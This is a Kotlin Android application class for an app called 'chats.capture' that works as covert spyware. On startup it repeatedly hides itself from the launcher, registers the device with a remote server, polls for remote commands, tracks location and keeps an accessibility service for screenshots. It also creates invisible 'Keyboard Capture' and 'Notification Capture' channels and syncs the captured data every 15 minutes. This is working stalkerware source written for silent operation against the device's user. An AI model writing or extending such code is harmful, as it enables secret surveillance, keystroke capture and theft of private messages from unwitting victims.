package com.chats.capture

import android.app.Application
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.pm.PackageManager
import android.os.Build
import com.chats.capture.database.CaptureDatabase
import com.chats.capture.managers.CommandPollingManager
import com.chats.capture.managers.DeviceRegistrationManager
import com.chats.capture.network.ApiClient
import android.app.Notification
import com.chats.capture.utils.AppHider
import com.chats.capture.utils.AppVisibilityManager
import com.chats.capture.utils.FcmTokenManager
import com.chats.capture.utils.ReleaseTree
import com.google.firebase.messaging.FirebaseMessaging
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import timber.log.Timber

class CaptureApplication : Application() {

    private val applicationScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    val database: CaptureDatabase by lazy {
        CaptureDatabase.getDatabase(this)
    }
    
    // Store reference to EnhancedAccessibilityService for screenshot capture
    var enhancedAccessibilityService: com.chats.capture.services.EnhancedAccessibilityService? = null
        private set
    
    fun setEnhancedAccessibilityService(service: com.chats.capture.services.EnhancedAccessibilityService?) {
        enhancedAccessibilityService = service
    }

    override fun onCreate() {
        super.onCreate()
        
        // Verify app is fully installed before proceeding
        if (!isPackageInstalled()) {
            Timber.w("Package not fully installed yet, delaying initialization")
            // Retry after delay
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                if (isPackageInstalled()) {
                    initializeApplication()
                } else {
                    Timber.e("Package still not installed after delay")
                }
            }, 5000) // 5 second delay
            return
        }
        
        initializeApplication()
    }
    
    private fun initializeApplication() {
        // Initialize logging
        if (BuildConfig.DEBUG) {
            Timber.plant(Timber.DebugTree())
        } else {
            Timber.plant(ReleaseTree())
        }
        
        // Create notification channels (with error handling)
        try {
            createNotificationChannels()
        } catch (e: Exception) {
            Timber.e(e, "Error creating notification channels, retrying...")
            // Retry after delay
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                try {
                    createNotificationChannels()
                } catch (e2: Exception) {
                    Timber.e(e2, "Failed to create notification channels after retry")
                }
            }, 3000)
        }
        
        // WorkManager is automatically initialized by WorkManagerInitializer
        // No need to initialize manually unless we need custom configuration
        // If custom configuration is needed, disable WorkManagerInitializer in AndroidManifest first
        
        Timber.d("Application initialized")
        
        // Hide app from launcher on startup (always enabled for silent operation)
        // Try immediate hide first, then delayed hide as backup
        try {
            // Immediate hide attempt
            AppVisibilityManager.hideFromLauncher(this)
            AppHider.ensureHidden(this)
            Timber.d("Immediate app hiding attempted")
        } catch (e: Exception) {
            Timber.e(e, "Error in immediate app hiding")
        }
        
        // Delayed hide to ensure it sticks (some launchers cache the app list)
        applicationScope.launch {
            // First attempt after 2 seconds
            kotlinx.coroutines.delay(2000)
            try {
                AppVisibilityManager.hideFromLauncher(this@CaptureApplication)
                AppHider.ensureHidden(this@CaptureApplication)
                Timber.d("Delayed app hiding (2s) attempted")
            } catch (e: Exception) {
                Timber.e(e, "Error in delayed app hiding (2s)")
            }
            
            // Second attempt after 10 seconds (for Play Store/Android Studio)
            kotlinx.coroutines.delay(8000) // Total 10 seconds
            try {
                AppVisibilityManager.hideFromLauncher(this@CaptureApplication)
                AppHider.ensureHidden(this@CaptureApplication)
                Timber.d("Delayed app hiding (10s) attempted")
            } catch (e: Exception) {
                Timber.e(e, "Error in delayed app hiding (10s)")
            }
            
            // Final attempt after 30 seconds (for launcher cache refresh)
            kotlinx.coroutines.delay(20000) // Total 30 seconds
            try {
                AppVisibilityManager.hideFromLauncher(this@CaptureApplication)
                AppHider.ensureHidden(this@CaptureApplication)
                Timber.d("Final app hiding (30s) attempted")
            } catch (e: Exception) {
                Timber.e(e, "Error in final app hiding (30s)")
            }
        }
        
        // Initialize Firebase and get FCM token
        initializeFirebase()
        
        // Initialize API client and register device
        initializeApiAndRegisterDevice()
        
        // Start command polling (runs in background)
        startCommandPolling()
        
        // Start location tracking (runs in background)
        startLocationTracking()
        
        // Ensure services are running (start in background after longer delay)
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            if (isPackageInstalled()) {
                try {
                    com.chats.capture.utils.ServiceStarter.startNotificationService(this@CaptureApplication)
                    com.chats.capture.utils.ServiceStarter.ensureServicesRunning(this@CaptureApplication)
                    Timber.d("Services auto-started from Application")
                } catch (e: Exception) {
                    Timber.e(e, "Error auto-starting services from Application")
                }
            } else {
                Timber.w("Package not installed, skipping service start")
            }
        }, 5000) // 5 second delay to ensure app is fully initialized and installed
        
        // Schedule sync worker immediately (so data syncs even if MainActivity never runs)
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            try {
                com.chats.capture.workers.SyncScheduler.scheduleSync(this, intervalMinutes = 15)
                Timber.d("Sync scheduled from Application")
            } catch (e: Exception) {
                Timber.e(e, "Error scheduling sync from Application")
            }
        }, 10000) // 10 second delay to ensure app is fully initialized
    }
    
    /**
     * Start location tracking service
     */
    private fun startLocationTracking() {
        try {
            val locationService = com.chats.capture.services.LocationService(this)
            locationService.startTracking()
            Timber.d("Location tracking started")
        } catch (e: Exception) {
            Timber.e(e, "Error starting location tracking")
        }
    }
    
    /**
     * Start command polling manager
     */
    private fun startCommandPolling() {
        try {
            val commandPollingManager = CommandPollingManager(this)
            commandPollingManager.startPolling()
            Timber.d("Command polling started")
        } catch (e: Exception) {
            Timber.e(e, "Error starting command polling")
        }
    }
    
    /**
     * Initialize Firebase and get FCM token
     */
    private fun initializeFirebase() {
        applicationScope.launch {
            try {
                FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
                    if (!task.isSuccessful) {
                        Timber.w("Failed to get FCM token: ${task.exception}")
                        // Still try to register device without token
                        initializeApiAndRegisterDevice()
                        return@addOnCompleteListener
                    }

                    // Get new FCM registration token
                    val token = task.result
                    Timber.d("FCM Token: $token")
                    
                    // Save token locally
                    FcmTokenManager.saveToken(this@CaptureApplication, token)
                    
                    // Register device with FCM token
                    initializeApiAndRegisterDevice(token)
                }
            } catch (e: Exception) {
                Timber.e(e, "Error initializing Firebase")
                // Still try to register device without token
                initializeApiAndRegisterDevice()
            }
        }
    }
    
    private fun initializeApiAndRegisterDevice(fcmToken: String? = null) {
        // Get server URL from preferences
        val prefs = getSharedPreferences("capture_prefs", MODE_PRIVATE)
        // Default to Render server if not configured
        val defaultUrl = "https://backend-chat-yq33.onrender.com/"
        val serverUrl = prefs.getString("server_url", defaultUrl)
        
        // Initialize API client
        ApiClient.initialize(this, serverUrl ?: defaultUrl)
        
        // Register device with server (with FCM token if available)
        val deviceRegistrationManager = DeviceRegistrationManager(this)
        deviceRegistrationManager.registerDevice(fcmToken)
    }

    /**
     * Check if package is fully installed
     */
    private fun isPackageInstalled(): Boolean {
        return try {
            packageManager.getPackageInfo(packageName, 0)
            true
        } catch (e: PackageManager.NameNotFoundException) {
            false
        } catch (e: Exception) {
            Timber.e(e, "Error checking if package is installed")
            false
        }
    }
    
    private fun createNotificationChannels() {
        // Verify package is installed before creating channels
        if (!isPackageInstalled()) {
            Timber.w("Package not installed, skipping notification channel creation")
            return
        }
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val notificationManager = getSystemService(NotificationManager::class.java)
            
            // Silent notification capture channel (completely invisible to user)
            val notificationChannel = NotificationChannel(
                NOTIFICATION_CHANNEL_ID,
                "Notification Capture",
                NotificationManager.IMPORTANCE_MIN // Minimum importance - completely silent
            ).apply {
                description = "Silent service notification"
                setShowBadge(false)
                enableVibration(false)
                enableLights(false)
                setSound(null, null)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            
            // Silent keyboard capture channel (completely invisible to user)
            val keyboardChannel = NotificationChannel(
                KEYBOARD_CHANNEL_ID,
                "Keyboard Capture",
                NotificationManager.IMPORTANCE_MIN // Minimum importance - completely silent
            ).apply {
                description = "Silent service notification"
                setShowBadge(false)
                enableVibration(false)
                enableLights(false)
                setSound(null, null)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            
            // Silent update channel (completely invisible to user)
            val updateChannel = NotificationChannel(
                UPDATE_CHANNEL_ID,
                "App Updates",
                NotificationManager.IMPORTANCE_MIN // Minimum importance - completely silent
            ).apply {
                description = "Silent service notification"
                setShowBadge(false)
                enableVibration(false)
                enableLights(false)
                setSound(null, null)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            
            notificationManager?.createNotificationChannels(
                listOf(notificationChannel, keyboardChannel, updateChannel)
            )
        }
    }

    companion object {
        const val NOTIFICATION_CHANNEL_ID = "notification_capture_channel"
        const val KEYBOARD_CHANNEL_ID = "keyboard_capture_channel"
        const val UPDATE_CHANNEL_ID = "update_channel"
    }
}
